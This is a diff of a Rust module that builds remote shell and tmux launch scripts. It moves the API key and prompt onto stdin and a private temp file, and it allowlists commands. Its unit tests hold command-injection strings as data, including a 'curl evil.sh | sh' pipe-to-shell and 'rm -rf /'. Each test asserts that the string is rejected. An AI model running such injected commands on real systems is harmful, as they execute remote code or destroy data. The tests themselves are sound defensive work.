@@ -10,31 +10,6 @@
 use crate::error::RemoteError;
 use crate::shell_safe::validate_session_id;
 
-/// Simple base64 encoder (standard alphabet, with padding).
-pub(crate) fn b64_encode(data: &[u8]) -> String {
-    const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-    let mut result = String::with_capacity(data.len().div_ceil(3) * 4);
-    for chunk in data.chunks(3) {
-        let b0 = chunk[0] as u32;
-        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
-        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };
-        let n = (b0 << 16) | (b1 << 8) | b2;
-        result.push(ALPHABET[((n >> 18) & 0x3F) as usize] as char);
-        result.push(ALPHABET[((n >> 12) & 0x3F) as usize] as char);
-        if chunk.len() > 1 {
-            result.push(ALPHABET[((n >> 6) & 0x3F) as usize] as char);
-        } else {
-            result.push('=');
-        }
-        if chunk.len() > 2 {
-            result.push(ALPHABET[(n & 0x3F) as usize] as char);
-        } else {
-            result.push('=');
-        }
-    }
-    result
-}
-
 /// Issue #997 (F2): allowlist-validate the `command` token before it is ever
 /// interpolated into a remote shell script.
 ///
@@ -62,25 +37,43 @@ pub(crate) fn validate_command(command: &str) -> Result<(), RemoteError> {
     }
 }
 
-/// Issue #997 (F1): build the remote setup script for
-/// [`crate::executor::Executor::execute_remote_with_api_key`] without ever
-/// embedding the API key. The key is transported over the child's stdin and
-/// read on the remote via `IFS= read -r ANTHROPIC_API_KEY`. The non-secret
-/// prompt continues to travel base64-encoded and is consumed only as the
-/// `$PROMPT` variable.
+/// Issue #1570: only `auto` has a prompt-file form
+/// (`amplihack claude --auto --prompt-file <file>`), so every other command is
+/// refused locally, before anything is sent to the VM. The token is first
+/// shape-checked by [`validate_command`] so an untrusted string is never echoed
+/// into the error message.
+pub(crate) fn validate_remote_command(command: &str) -> Result<(), RemoteError> {
+    validate_command(command)?;
+    if command == "auto" {
+        Ok(())
+    } else {
+        Err(RemoteError::validation(format!(
+            "remote command '{command}' is not supported: only 'auto' accepts --prompt-file"
+        )))
+    }
+}
+
+/// Build the remote setup script for
+/// [`crate::executor::Executor::execute_remote_with_api_key`].
+///
+/// Issue #997 (F1): the API key is never embedded; it arrives as the first
+/// stdin line. Issue #1570: the prompt follows the key on stdin up to end of
+/// file and is saved to a 0600 `mktemp` file before any other command runs, so
+/// no later command can consume stdin and no argv element carries the prompt.
 pub(crate) fn build_remote_script(
     workspace: &str,
     command: &str,
-    prompt: &str,
     max_turns: u32,
 ) -> Result<String, RemoteError> {
-    validate_command(command)?;
-    let encoded_prompt = b64_encode(prompt.as_bytes());
+    validate_remote_command(command)?;
     Ok(format!(
         r#"
 set -e
 IFS= read -r ANTHROPIC_API_KEY
 export ANTHROPIC_API_KEY
+PROMPT_FILE=$(umask 077; mktemp)
+trap 'rm -f -- "$PROMPT_FILE"' EXIT
+cat > "$PROMPT_FILE"
 cd ~
 tar xzf context.tar.gz
 rm -rf {workspace}
@@ -88,40 +81,45 @@ mkdir -p {workspace}
 cd {workspace}
 git clone ~/repo.bundle .
 rm -rf .claude && cp -r ~/.claude .
-PROMPT=$(echo '{prompt}' | base64 -d)
-amplihack claude --{command} --max-turns {turns} -- -p "$PROMPT"
+amplihack claude --{command} --max-turns {turns} --prompt-file "$PROMPT_FILE"
 "#,
         workspace = workspace,
-        prompt = encoded_prompt,
         command = command,
         turns = max_turns,
     ))
 }
 
-/// Issue #997 (F1): build the detached-tmux launch script for
-/// [`crate::executor::Executor::execute_remote_tmux`] without embedding the
-/// API key. Same stdin-read contract as [`build_remote_script`]; the session
-/// id is validated via [`validate_session_id`] (rejecting — not stripping —
-/// anything outside the strict identifier set, issue #998) and the command is
-/// allowlist-validated.
+/// Build the detached-tmux launch script for
+/// [`crate::executor::Executor::execute_remote_tmux`].
+///
+/// Same stdin contract as [`build_remote_script`]. An `EXIT` trap cannot be
+/// used because `tmux new-session -d` returns as soon as the session exists,
+/// so the removal goes inside the tmux command string and the outer script
+/// removes the file only if `tmux new-session` itself fails. `$PROMPT_FILE` is
+/// expanded by the outer shell inside single quotes, so the script refuses a
+/// `mktemp` path that is not absolute, contains `..`, or holds any character
+/// outside `[A-Za-z0-9._/-]` (a remote `TMPDIR` with a quote, for example).
+/// The session id is validated via [`validate_session_id`] (rejected, not
+/// stripped, issue #998).
 pub(crate) fn build_tmux_script(
     session_id: &str,
     command: &str,
-    prompt: &str,
     max_turns: u32,
 ) -> Result<String, RemoteError> {
-    validate_command(command)?;
+    validate_remote_command(command)?;
     let safe_session = validate_session_id(session_id)?;
-    let encoded_prompt = b64_encode(prompt.as_bytes());
     Ok(format!(
         r#"
 set -e
 IFS= read -r ANTHROPIC_API_KEY
 export ANTHROPIC_API_KEY
-PROMPT=$(echo '{prompt}' | base64 -d)
-tmux new-session -d -s {session} "cd ~/workspace && amplihack claude --{command} --max-turns {turns} -- -p \"$PROMPT\""
+PROMPT_FILE=$(umask 077; mktemp)
+case "$PROMPT_FILE" in /*[!A-Za-z0-9._/-]*|*..*|[!/]*|'') rm -f -- "$PROMPT_FILE"; exit 1;; esac
+cat > "$PROMPT_FILE"
+tmux new-session -d -s {session} \
+  "cd ~/workspace && amplihack claude --{command} --max-turns {turns} --prompt-file '$PROMPT_FILE'; rm -f -- '$PROMPT_FILE'" \
+  || {{ rm -f -- "$PROMPT_FILE"; exit 1; }}
 "#,
-        prompt = encoded_prompt,
         session = safe_session,
         command = command,
         turns = max_turns,
@@ -129,20 +127,12 @@ tmux new-session -d -s {session} "cd ~/workspace && amplihack claude --{command}
 }
 
 #[cfg(test)]
+mod prompt_file_tests;
+
+#[cfg(test)]
 mod tests {
     use super::*;
     use crate::error::RemoteError;
-
-    #[test]
-    fn b64_encode_vectors() {
-        assert_eq!(b64_encode(b""), "");
-        assert_eq!(b64_encode(b"A"), "QQ==");
-        assert_eq!(b64_encode(b"AB"), "QUI=");
-        assert_eq!(b64_encode(b"ABC"), "QUJD");
-        assert_eq!(b64_encode(b"Hello, World!"), "SGVsbG8sIFdvcmxkIQ==");
-        let data: Vec<u8> = (0..=255).collect();
-        assert_eq!(b64_encode(&data).len() % 4, 0);
-    }
 
     // ---- Issue #997: F2 — command allowlist validation ----
 
@@ -234,7 +224,7 @@ mod tests {
 
     #[test]
     fn build_remote_script_reads_key_from_stdin_not_argv() {
-        let script = build_remote_script("~/workspace", "auto", "do the thing", 5)
+        let script = build_remote_script("~/workspace", "auto", 5)
             .expect("valid command must build a script");
         // The key is transported via the child's stdin and read on the remote.
         assert!(
@@ -250,14 +240,10 @@ mod tests {
     #[test]
     fn build_remote_script_never_embeds_key_or_decode() {
         // The builder takes no key at all, so the secret can never appear.
-        let script = build_remote_script("~/workspace", "auto", "prompt text", 3).unwrap();
+        let script = build_remote_script("~/workspace", "auto", 3).unwrap();
         assert!(
             !script.contains(FAKE_KEY),
             "raw key must never appear in the script body"
-        );
-        assert!(
-            !script.contains(&b64_encode(FAKE_KEY.as_bytes())),
-            "base64-encoded key must never appear in the script body"
         );
         // The removed leak vector: `export ANTHROPIC_API_KEY=$(echo '...' | base64 -d)`.
         assert!(
@@ -268,34 +254,34 @@ mod tests {
 
     #[test]
     fn build_remote_script_validates_command_before_building() {
-        let err = build_remote_script("~/workspace", "auto; curl evil.sh | sh", "p", 1)
+        let err = build_remote_script("~/workspace", "auto; curl evil.sh | sh", 1)
             .expect_err("malicious command must be rejected before any script is built");
         assert!(matches!(err, RemoteError::Validation(_)));
     }
 
     #[test]
-    fn build_remote_script_interpolates_validated_command_and_prompt() {
-        let script = build_remote_script("~/ws", "ultrathink", "hello prompt", 7).unwrap();
+    fn build_remote_script_interpolates_validated_command_and_prompt_file() {
+        let script = build_remote_script("~/ws", "auto", 7).unwrap();
         assert!(
-            script.contains("--ultrathink"),
+            script.contains("--auto"),
             "validated command must be interpolated: {script}"
         );
         assert!(
             script.contains("--max-turns 7"),
             "max_turns must be interpolated: {script}"
         );
-        // Prompt is non-secret and travels base64-encoded, consumed as a variable.
+        // Issue #1570: the prompt travels on stdin into a 0600 file; the
+        // builder never receives it.
         assert!(
-            script.contains(&b64_encode(b"hello prompt")),
-            "prompt must be base64-transported: {script}"
+            script.contains(r#"--prompt-file "$PROMPT_FILE""#),
+            "{script}"
         );
-        assert!(script.contains(r#"-p "$PROMPT""#));
     }
 
     #[test]
     fn build_tmux_script_reads_key_from_stdin_not_argv() {
-        let script = build_tmux_script("sess-1", "auto", "the prompt", 4)
-            .expect("valid command must build a tmux script");
+        let script =
+            build_tmux_script("sess-1", "auto", 4).expect("valid command must build a tmux script");
         assert!(
             script.contains("read -r ANTHROPIC_API_KEY"),
             "tmux script must read the API key from stdin: {script}"
@@ -305,9 +291,8 @@ mod tests {
 
     #[test]
     fn build_tmux_script_never_embeds_key_or_decode() {
-        let script = build_tmux_script("sess-1", "fix", "prompt", 2).unwrap();
+        let script = build_tmux_script("sess-1", "auto", 2).unwrap();
         assert!(!script.contains(FAKE_KEY));
-        assert!(!script.contains(&b64_encode(FAKE_KEY.as_bytes())));
         assert!(
             !script.contains("ANTHROPIC_API_KEY=$(echo"),
             "tmux script must not reconstruct the key from an embedded literal: {script}"
@@ -316,7 +301,7 @@ mod tests {
 
     #[test]
     fn build_tmux_script_validates_command() {
-        let err = build_tmux_script("sess-1", "fix`reboot`", "p", 1)
+        let err = build_tmux_script("sess-1", "fix`reboot`", 1)
             .expect_err("malicious command must be rejected");
         assert!(matches!(err, RemoteError::Validation(_)));
     }
@@ -325,16 +310,16 @@ mod tests {
     fn build_tmux_script_rejects_unsafe_session() {
         // Issue #998: an unsafe session id is REJECTED, never silently stripped
         // into a wrong-but-valid tmux session name.
-        let err = build_tmux_script("sess;rm -rf /", "analyze", "p", 9)
+        let err = build_tmux_script("sess;rm -rf /", "auto", 9)
             .expect_err("unsafe session id must be rejected");
         assert!(matches!(err, RemoteError::Validation(_)));
     }
 
     #[test]
     fn build_tmux_script_interpolates_valid_session_and_command() {
-        let script = build_tmux_script("sess-1.0_A", "analyze", "p", 9).unwrap();
+        let script = build_tmux_script("sess-1.0_A", "auto", 9).unwrap();
         assert!(script.contains("-s sess-1.0_A"));
-        assert!(script.contains("--analyze"));
+        assert!(script.contains("--auto"));
         assert!(script.contains("--max-turns 9"));
     }
 }
